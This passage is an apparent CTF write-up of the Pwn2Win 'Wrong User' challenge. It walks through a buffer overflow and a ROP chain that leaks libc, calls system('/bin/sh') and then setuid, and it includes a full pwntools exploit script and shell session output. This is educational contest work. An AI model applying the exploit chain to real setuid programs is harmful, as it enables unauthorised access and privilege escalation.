      <category term="orderby" scheme="https://teamrocketist.github.io/tags/orderby/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] Pwn2Win - Wrong User</title>
    <link href="https://teamrocketist.github.io/2017/10/23/Pwn-Pwn2Win-Wrong-User/"/>
    <id>https://teamrocketist.github.io/2017/10/23/Pwn-Pwn2Win-Wrong-User/</id>
    <published>2017-10-23T08:31:07.000Z</published>
    <updated>2017-12-13T17:22:03.492Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Wrong User<br><br>Molly invaded an important system of Bloodsuckers and obtained sensitive information. She believes that you are also capable of invading such system and therefore she left a secret message to you. Can you get such message? Maybe you get troubles to get access with the correct user.<br><br>Server: nc 10.133.70.1 6666<br><br><a href="https://cloud.ufscar.br:8080/v1/AUTH_c93b694078064b4f81afd2266a502511/static.pwn2win.party/wronguser_1e8787242eb826005729b0ba17a925b0782be65190f18a1b8dc4e57756c4e3c4.tar.gz" target="_blank" rel="external">https://cloud.ufscar.br:8080/v1/AUTH_c93b694078064b4f81afd2266a502511/static.pwn2win.party/wronguser_1e8787242eb826005729b0ba17a925b0782be65190f18a1b8dc4e57756c4e3c4.tar.gz</a><br><br><a href="https://static.pwn2win.party/wronguser_1e8787242eb826005729b0ba17a925b0782be65190f18a1b8dc4e57756c4e3c4.tar.gz" target="_blank" rel="external">https://static.pwn2win.party/wronguser_1e8787242eb826005729b0ba17a925b0782be65190f18a1b8dc4e57756c4e3c4.tar.gz</a><br><br>Id: wrong_user<br><br>Total solves: 8<br><br>Score: 373<br><br>Categories: Exploitation<br></blockquote>

<p>Using radare2 to disassembly the binary:<br><a data-fancybox="gallery" href="https://i.imgur.com/AFxRIiY.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/AFxRIiY.png" alt=""><br></a><br>We have <strong>fgets</strong> with a very large size <strong>0x400</strong>, it reads from the <strong>STDIN</strong> so we can control what to put in the buffer it’s obvious to see that we have a buffer overflow if we check what kind of protections with checksec:<br><a data-fancybox="gallery" href="https://i.imgur.com/i1sx2G2.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/i1sx2G2.png" alt=""><br></a><br>No <strong>stack canary</strong> protection, but <strong>NX</strong> is enabled (Non-Executable Stack) once again we have to use <strong>Return Oriented Programming</strong> (ROP), the challenge provided the <strong>libc.so</strong> so we can use to calculate the offsets.</p>
<p>The steps to solve are:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 - Overflow the Buffer</div><div class="line">2 - ROP chain to leak libc addresses and return to main</div><div class="line">3 - Overflow the Buffer again and build a ROP chain to call system(&apos;/bin/sh&apos;)</div></pre></td></tr></table></figure>
<h3 id="Overflow-the-Buffer"><a href="#Overflow-the-Buffer" class="headerlink" title="Overflow the Buffer"></a>Overflow the Buffer</h3><p>Well this always the same first we can create a pattern with <strong>metasploit</strong>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 50</div><div class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab</div><div class="line">$ gdb ./wrong</div><div class="line"></div><div class="line">pwndbg&gt; b *0x400781</div><div class="line">Breakpoint 1 at 0x400781</div><div class="line">pwndbg&gt; r</div><div class="line">Starting program: /home/user/ctf/wrong </div><div class="line">Hello! What is your name?</div><div class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab</div><div class="line">Nice to meet you Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab</div><div class="line"></div><div class="line">Breakpoint *0x400781</div><div class="line">pwndbg&gt; x <span class="variable">$rsp</span></div><div class="line">0x7fffffffdea8:	0x62413362</div></pre></td></tr></table></figure>
<p>Now that we got the part of the string pattern that we got from the <strong>RSP</strong> register we can calculate its offset once again using <strong>metasploit</strong>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x62413362</div><div class="line">[*] Exact match at offset 40</div></pre></td></tr></table></figure>
<p>Finally the padding we require is 40…</p>
<h3 id="ROP-chain-to-leak-libc-addresses-and-return-to-main"><a href="#ROP-chain-to-leak-libc-addresses-and-return-to-main" class="headerlink" title="ROP chain to leak libc addresses and return to main"></a>ROP chain to leak libc addresses and return to main</h3><p>We need to leak a libc address we can do this with <strong>puts</strong> or <strong>printf</strong> they are both present in the binary, because of this they will be also be in the <strong>GOT</strong> (Global Offset Table) as we can check their location addresses using <strong>objdump -R ./wrong</strong>: </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">$ objdump -R ./wrong</div><div class="line"></div><div class="line">./wrong:     file format elf64-x86-64</div><div class="line"></div><div class="line">DYNAMIC RELOCATION RECORDS</div><div class="line">OFFSET           TYPE              VALUE </div><div class="line">0000000000600b58 R_X86_64_GLOB_DAT  __gmon_start__</div><div class="line">0000000000600bd0 R_X86_64_COPY     stdout@@GLIBC_2.2.5</div><div class="line">0000000000600bd8 R_X86_64_COPY     stdin@@GLIBC_2.2.5</div><div class="line">0000000000600b78 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5</div><div class="line">0000000000600b80 R_X86_64_JUMP_SLOT  getuid@GLIBC_2.2.5</div><div class="line">0000000000600b88 R_X86_64_JUMP_SLOT  <span class="built_in">printf</span>@GLIBC_2.2.5</div><div class="line">0000000000600b90 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5</div><div class="line">0000000000600b98 R_X86_64_JUMP_SLOT  fgets@GLIBC_2.2.5</div><div class="line">0000000000600ba0 R_X86_64_JUMP_SLOT  __gmon_start__</div><div class="line">0000000000600ba8 R_X86_64_JUMP_SLOT  fflush@GLIBC_2.2.5</div><div class="line">0000000000600bb0 R_X86_64_JUMP_SLOT  setuid@GLIBC_2.2.5</div></pre></td></tr></table></figure>
<p>We want to get the address that’s stored in the <strong>GOT</strong> of <strong>puts</strong> with it we can calculate the offsets to another useful libc functions like <strong>system</strong> and the offset to the string <strong>/bin/sh</strong>, to call a function within <strong>ROP</strong> we need the <strong>PLT</strong> address we can get them using <strong>objdump -dj.plt ./wrong</strong>: </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$ objdump -dj.plt ./wrong</div><div class="line"></div><div class="line">./wrong:     file format elf64-x86-64</div><div class="line"></div><div class="line"></div><div class="line">Disassembly of section .plt:</div><div class="line"></div><div class="line">0000000000400560 &lt;.plt&gt;</div><div class="line">0000000000400570 &lt;puts@plt&gt;</div><div class="line">0000000000400580 &lt;getuid@plt&gt;</div><div class="line">0000000000400590 &lt;<span class="built_in">printf</span>@plt&gt;</div><div class="line">00000000004005a0 &lt;__libc_start_main@plt&gt;</div><div class="line">00000000004005b0 &lt;fgets@plt&gt;</div><div class="line">00000000004005c0 &lt;__gmon_start__@plt&gt;</div><div class="line">00000000004005d0 &lt;fflush@plt&gt;</div><div class="line">00000000004005e0 &lt;setuid@plt&gt;</div></pre></td></tr></table></figure>
<p>Since this is a <strong>64bit</strong> binary we need to store the function arguments in registers instead of putting them in the stack, we can do this using <strong>ROPGadgets</strong>, in x64 the first six parameters are saved in <strong>RDI, RSI, RDX, RCX, R8 and R9</strong>, if there are more parameters will be saved on the <strong>stack</strong>. Since <strong>puts</strong> only has 1 argument we just need a <strong>Gadget</strong> that <strong>pop</strong> an address from the <strong>stack</strong> into the <strong>RDI</strong> register, <strong>ROPGadget</strong> can help us finding such a gadget:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">$ ROPgadget --binary ./wrong --only &quot;pop|ret&quot;</div><div class="line">Gadgets information</div><div class="line">============================================================</div><div class="line">0x00000000004007ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</div><div class="line">0x00000000004007ee : pop r13 ; pop r14 ; pop r15 ; ret</div><div class="line">0x00000000004007f0 : pop r14 ; pop r15 ; ret</div><div class="line">0x00000000004007f2 : pop r15 ; ret</div><div class="line">0x00000000004007eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</div><div class="line">0x00000000004007ef : pop rbp ; pop r14 ; pop r15 ; ret</div><div class="line">0x0000000000400650 : pop rbp ; ret</div><div class="line">0x00000000004007f3 : pop rdi ; ret</div><div class="line">0x00000000004007f1 : pop rsi ; pop r15 ; ret</div><div class="line">0x00000000004007ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</div><div class="line">0x0000000000400559 : ret</div></pre></td></tr></table></figure>
<p>The <strong>0x00000000004007f3 : pop rdi ; ret</strong> gadget is the one we need, now we just need the address from main so after we run our gadget we can return back to main:<br><a data-fancybox="gallery" href="https://i.imgur.com/8OMMSxC.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/8OMMSxC.png" alt=""><br></a><br>Now that we have everything we need we can start building our ropchain:<br><a data-fancybox="gallery" href="https://i.imgur.com/Oc3R7sF.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/Oc3R7sF.png" alt=""><br></a></p>
<h3 id="Overflow-the-Buffer-again-and-build-a-ROP-chain-to-call-system-‘-bin-sh’"><a href="#Overflow-the-Buffer-again-and-build-a-ROP-chain-to-call-system-‘-bin-sh’" class="headerlink" title="Overflow the Buffer again and build a ROP chain to call system(‘/bin/sh’)"></a>Overflow the Buffer again and build a ROP chain to call system(‘/bin/sh’)</h3><p>Now we have everything we need to calculate other <strong>libc</strong> addresses we need help from <strong>libc.so.6</strong> file they gave us <strong>pwntools</strong> can help us to get the offsets in a easier way:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">BINSH_OFFSET = <span class="number">0x18cd17</span> <span class="comment"># strings -a -t x libc.so.6 | grep '/bin/sh'</span></div><div class="line"></div><div class="line">binary = ELF(<span class="string">'./wrong'</span>)</div><div class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</div><div class="line"></div><div class="line">PADDING = <span class="string">'A'</span>*<span class="number">40</span></div><div class="line">POPRET = <span class="number">0x4007f3</span></div><div class="line">PUTSPLT = binary.plt[<span class="string">'puts'</span>] <span class="comment">#0x000000000040056c</span></div><div class="line">PUTSGOT = binary.got[<span class="string">'puts'</span>]</div><div class="line">MAIN = <span class="number">0x4006e6</span></div><div class="line"></div><div class="line">ropchain = <span class="string">''</span></div><div class="line">ropchain += p64(POPRET) <span class="comment"># POP RDI; RET</span></div><div class="line">ropchain += p64(PUTSGOT) <span class="comment"># PUTS ADDRESS ARG[1]</span></div><div class="line">ropchain += p64(PUTSPLT) <span class="comment"># PUTS function "call"</span></div><div class="line"></div><div class="line">ropchain += p64(MAIN) <span class="comment"># MAIN function "call"</span></div><div class="line"> </div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'Hello! What is your name?\n'</span>)</div><div class="line"><span class="comment">#time.sleep(1)</span></div><div class="line">r.sendline(PADDING+ropchain)</div><div class="line"><span class="keyword">print</span> r.recv(len(<span class="string">'Nice to meet you '</span>)+len(PADDING)+<span class="number">3</span>)</div><div class="line"><span class="comment">#</span></div><div class="line"></div><div class="line">PUTS = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'Hello! What is your name?\n'</span>)</div><div class="line"></div><div class="line">LIBCBASE = PUTS -libc.symbols[<span class="string">'puts'</span>]</div><div class="line">BINSH = LIBCBASE + BINSH_OFFSET</div><div class="line">SYSTEM = LIBCBASE + libc.symbols[<span class="string">'system'</span>]</div><div class="line">log.info(<span class="string">"LEAKED PUTS LIBC 0x%x"</span> % PUTS)</div><div class="line">log.info(<span class="string">"SYSTEM LIBC 0x%x"</span> % SYSTEM)</div><div class="line">log.info(<span class="string">"LIBCBASE LIBC 0x%x"</span> % LIBCBASE)</div><div class="line">log.info(<span class="string">"BINSH ADDRESS 0x%x"</span> % BINSH)</div></pre></td></tr></table></figure>
<p>Now that we have the addresses we need we can start again to build a new <strong>ropchain</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/2cuyHS8.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/2cuyHS8.png" alt=""><br></a><br>Now the full exploit could be written as follows:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> time</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> process(<span class="string">'./wrong'</span>, env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">'./libc.so.6'</span>&#125;) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'10.133.70.1'</span>, <span class="number">6666</span>)</div><div class="line"></div><div class="line">local = <span class="keyword">True</span></div><div class="line"></div><div class="line">r = getConn()</div><div class="line"><span class="comment">#gdb.attach(r, '''</span></div><div class="line"><span class="comment">#	b *0x0040076c</span></div><div class="line"><span class="comment">#	c''')</span></div><div class="line"><span class="comment"># </span></div><div class="line">BINSH_OFFSET = <span class="number">0x18cd17</span> <span class="comment"># strings -a -t x libc.so.6 | grep '/bin/sh'</span></div><div class="line"></div><div class="line">binary = ELF(<span class="string">'./wrong'</span>)</div><div class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</div><div class="line"></div><div class="line">PADDING = <span class="string">'A'</span>*<span class="number">40</span></div><div class="line">POPRET = <span class="number">0x4007f3</span></div><div class="line">PUTSPLT = binary.plt[<span class="string">'puts'</span>] <span class="comment">#0x000000000040056c</span></div><div class="line">PUTSGOT = binary.got[<span class="string">'puts'</span>]</div><div class="line">MAIN = <span class="number">0x4006e6</span></div><div class="line"></div><div class="line">ropchain = <span class="string">''</span></div><div class="line">ropchain += p64(POPRET) <span class="comment"># POP RDI; RET</span></div><div class="line">ropchain += p64(PUTSGOT) <span class="comment"># PUTS ADDRESS ARG[1]</span></div><div class="line">ropchain += p64(PUTSPLT) <span class="comment"># PUTS function "call"</span></div><div class="line"></div><div class="line">ropchain += p64(MAIN) <span class="comment"># MAIN function "call"</span></div><div class="line"> </div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'Hello! What is your name?\n'</span>)</div><div class="line"><span class="comment">#time.sleep(1)</span></div><div class="line">r.sendline(PADDING+ropchain)</div><div class="line"><span class="keyword">print</span> r.recv(len(<span class="string">'Nice to meet you '</span>)+len(PADDING)+<span class="number">3</span>)</div><div class="line"><span class="comment">#</span></div><div class="line"></div><div class="line">PUTS = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'Hello! What is your name?\n'</span>)</div><div class="line"></div><div class="line">LIBCBASE = PUTS -libc.symbols[<span class="string">'puts'</span>]</div><div class="line">BINSH = LIBCBASE + BINSH_OFFSET</div><div class="line">SYSTEM = LIBCBASE + libc.symbols[<span class="string">'system'</span>]</div><div class="line">log.info(<span class="string">"LEAKED PUTS LIBC 0x%x"</span> % PUTS)</div><div class="line">log.info(<span class="string">"SYSTEM LIBC 0x%x"</span> % SYSTEM)</div><div class="line">log.info(<span class="string">"LIBCBASE LIBC 0x%x"</span> % LIBCBASE)</div><div class="line">log.info(<span class="string">"BINSH ADDRESS 0x%x"</span> % BINSH)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">ropchain = <span class="string">''</span></div><div class="line">ropchain += p64(POPRET) <span class="comment"># POP RDI; RET</span></div><div class="line">ropchain += p64(BINSH) <span class="comment"># BINSH ADDRESS ARG[1]</span></div><div class="line">ropchain += p64(SYSTEM) <span class="comment"># SYSTEM function "call"</span></div><div class="line"></div><div class="line">ropchain += p64(MAIN) <span class="comment"># MAIN function "call"</span></div><div class="line"></div><div class="line"></div><div class="line">r.sendline(PADDING+ropchain)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
<p>If you run it you will get a shell to the server:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">python wrong_part1.py </div><div class="line">[+] Opening connection to 10.133.70.1 on port 6666: Done</div><div class="line">/usr/<span class="built_in">local</span>/lib/python2.7/dist-packages/unicorn/unicorn.py:6: UserWarning: Module hashlib was already imported from /usr/lib/python2.7/hashlib.pyc, but /usr/<span class="built_in">local</span>/lib/python2.7/dist-packages is being added to sys.path</div><div class="line">  import pkg_resources</div><div class="line">/usr/<span class="built_in">local</span>/lib/python2.7/dist-packages/unicorn/unicorn.py:6: UserWarning: Module six was already imported from /home/evilgod/.<span class="built_in">local</span>/lib/python2.7/site-packages/six.pyc, but /usr/lib/python2.7/dist-packages is being added to sys.path</div><div class="line">  import pkg_resources</div><div class="line">[*] <span class="string">'/home/evilgod/Documents/Hacking/ctf/pwn2win/exploitation/WrongUser/wrong'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    No RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">[*] <span class="string">'/home/evilgod/Documents/Hacking/ctf/pwn2win/exploitation/WrongUser/libc.so.6'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      PIE enabled</div><div class="line">Hello! What is your name?</div><div class="line"></div><div class="line">Nice to meet you AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@</div><div class="line"></div><div class="line">Hello! What is your name?</div><div class="line"></div><div class="line">[*] LEAKED PUTS LIBC 0x7fd320e62690</div><div class="line">[*] SYSTEM LIBC 0x7fd320e38390</div><div class="line">[*] LIBCBASE LIBC 0x7fd320df3000</div><div class="line">[*] BINSH ADDRESS 0x7fd320f7fd17</div><div class="line">[*] Switching to interactive mode</div><div class="line">Nice to meet you AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@<span class="variable">$id</span></div><div class="line">uid=1001(wrong-user) gid=1001(wrong-user) groups=1001(wrong-user)</div><div class="line"></div><div class="line">$ <span class="built_in">cd</span> home</div><div class="line">$ ls</div><div class="line"><span class="keyword">case</span></div><div class="line">molly</div><div class="line">ubuntu</div><div class="line">wrong-user</div><div class="line">$ <span class="built_in">cd</span> molly</div><div class="line">$ ls</div><div class="line">flag.txt</div><div class="line">wrong</div><div class="line">$ cat flag.txt</div><div class="line">cat: flag.txt: Permission denied</div><div class="line">$ ls -lta</div><div class="line">total 13</div><div class="line">drwxr-xr-x 6 root  root          6 Oct 21 10:25 ..</div><div class="line">drwxr-xr-x 2 root  molly         7 Aug 31 22:37 .</div><div class="line">-rw-r----- 1 molly molly        29 Aug 31 22:37 flag.txt</div><div class="line">-rwsr-x--- 1 molly wrong-user 7704 Aug 31 22:27 wrong</div><div class="line">-rw-r--r-- 1 root  molly       220 Aug 31 22:24 .bash_logout</div><div class="line">-rw-r--r-- 1 root  molly      3771 Aug 31 22:24 .bashrc</div><div class="line">-rw-r--r-- 1 root  molly       655 Aug 31 22:24 .profile</div></pre></td></tr></table></figure></p>
<p>So what’s wrong here? We don’t have access to the flag.txt, and happens we got access to the wrong user, there are some problems here, one of them is that in the beginning of the program we can see it’s being run <strong>setuid(getuid())</strong> :<br><a data-fancybox="gallery" href="https://i.imgur.com/pu2OY09.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/pu2OY09.png" alt=""><br></a></p>
<p>This will drop permissions from the as we can see when we did <strong>ls -lta</strong> the executable has the <strong>setuid</strong> enabled:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-rwsr-x--- 1 molly wrong-user 7704 Aug 31 22:27 wrong</div></pre></td></tr></table></figure></p>
<p>Translating this a little bit:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">OWNER:                                                         Group</div><div class="line">-rws                                                           r-x                               </div><div class="line">||||---&gt; Execute and setuid bit (both enabled).                |||</div><div class="line">|||---&gt; Write Permissions(enabled)                             || \--&gt; Executable permissions (Enabled)</div><div class="line">| \---&gt; Read permissions(enabled)                              | \--&gt; Write Permissions (Disabled)</div><div class="line"> \---&gt; If it&apos;s a directory(disabled)                            \---&gt; Read Permissions (Enabled)</div><div class="line"></div><div class="line">World:</div><div class="line">---</div><div class="line">|||</div><div class="line">|| \---&gt; Executable permissions (Disabled)</div><div class="line">| \---&gt; Write Permissions (Disabled)</div><div class="line"> \---&gt; Read Permissions (Disabled)</div></pre></td></tr></table></figure></p>
<p>When the <strong>setuid</strong> is enabled the process will run with <strong>owner</strong> permissions, but there are some issues that are dropping privileges, the <strong>setuid(getuid())</strong> is one of them this is simple to solve we just need to create a ropchain that calls <strong>setuid(molly_uid)</strong> first we need to find <strong>molly’s uid</strong> this is easy we can check <strong>/etc/passwd</strong> :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">$ cat /etc/passwd</div><div class="line">root:x:0:0:root:/root:/bin/bash</div><div class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</div><div class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</div><div class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</div><div class="line">sync:x:4:65534:sync:/bin:/bin/sync</div><div class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</div><div class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</div><div class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</div><div class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</div><div class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</div><div class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</div><div class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</div><div class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</div><div class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</div><div class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</div><div class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</div><div class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</div><div class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</div><div class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/<span class="literal">false</span></div><div class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/<span class="literal">false</span></div><div class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/<span class="literal">false</span></div><div class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/<span class="literal">false</span></div><div class="line">syslog:x:104:108::/home/syslog:/bin/<span class="literal">false</span></div><div class="line">_apt:x:105:65534::/nonexistent:/bin/<span class="literal">false</span></div><div class="line">lxd:x:106:65534::/var/lib/lxd/:/bin/<span class="literal">false</span></div><div class="line">messagebus:x:107:111::/var/run/dbus:/bin/<span class="literal">false</span></div><div class="line">uuidd:x:108:112::/run/uuidd:/bin/<span class="literal">false</span></div><div class="line">dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/<span class="literal">false</span></div><div class="line">sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin</div><div class="line">pollinate:x:111:1::/var/cache/pollinate:/bin/<span class="literal">false</span></div><div class="line">ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash</div><div class="line">wrong-user:x:1001:1001:,,,:/home/wrong-user:/bin/bash</div><div class="line">molly:x:1337:1337:,,,:/home/molly:/bin/bash</div><div class="line"><span class="keyword">case</span>:x:1002:1002:,,,:/home/<span class="keyword">case</span>:/bin/bash</div></pre></td></tr></table></figure>
<p>Molly’s uid is <strong>1337</strong> writing a ropchain is trivial, we can do it like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">SETUID = LIBCBASE + libc.symbols[<span class="string">'setuid'</span>]</div><div class="line"></div><div class="line">ropchain += p64(POPRET) <span class="comment"># POP RDI RET</span></div><div class="line">ropchain += p64(<span class="number">1337</span>) <span class="comment"># 1337 ARG[1]</span></div><div class="line">ropchain += p64(SETUID) <span class="comment"># SETUID function "call"</span></div></pre></td></tr></table></figure>
